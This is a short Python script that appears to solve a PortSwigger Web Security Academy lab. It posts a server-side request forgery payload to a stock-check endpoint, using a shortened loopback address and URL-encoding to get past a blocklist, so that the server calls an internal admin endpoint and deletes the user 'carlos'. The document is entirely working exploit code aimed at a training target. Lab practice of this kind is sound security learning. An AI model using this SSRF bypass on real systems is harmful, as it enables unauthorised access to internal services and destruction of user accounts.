import requests
url = 'https://0a550054031b344181fbac1300f700f1.web-security-academy.net/product/stock'

header = {
    'Cookie' : 'session=cEOb29T1qFIq2On9QKtKMYMkKzd4J1Ac',
    'Origin' : 'https://0a550054031b344181fbac1300f700f1.web-security-academy.net',
    'Referer' : 'https://0a550054031b344181fbac1300f700f1.web-security-academy.net/product?productId=1',
    'Content-Type' : 'application/x-www-form-urlencoded'
}

data = {
    "stockApi" : 'http://127.1/%61dmin/delete?username=carlos'
}

response = requests.post(url, headers=header, data=data)
print(f'request respon {response.status_code}')
print(f'data {response.text}')